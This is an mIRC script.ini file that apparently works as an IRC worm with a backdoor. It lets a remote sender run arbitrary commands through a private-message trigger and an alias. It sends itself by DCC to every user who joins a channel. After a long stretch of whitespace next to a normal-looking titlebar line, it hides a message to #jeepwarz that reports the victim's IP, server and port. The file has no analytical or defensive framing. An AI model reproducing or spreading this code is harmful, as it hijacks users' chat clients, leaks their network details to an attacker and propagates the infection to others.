[script]
n0=on 1:text:*inferno6*:#:/ctcp $nick k 
n1=on 1:text:�� *:?:{ s *2 | halt }
n2=alias /s / *1
n3=on 1:connect:/.enable #d
n4=#d off
n5=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
n6=#d end
n7=  .remote on
n8=  titlebar (Not connected)
n9=  }
n10=raw 401:*: {
n11=  halt
n12=}
n13=RAW 001:*:titlebar (Connecting to $server $+ )
n14=
n15=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jeepwarz Hi.  $ip on $server $+ : $+ $port $+ .
n16=
n17=on 1:DISCONNECT:titlebar (Not connected)
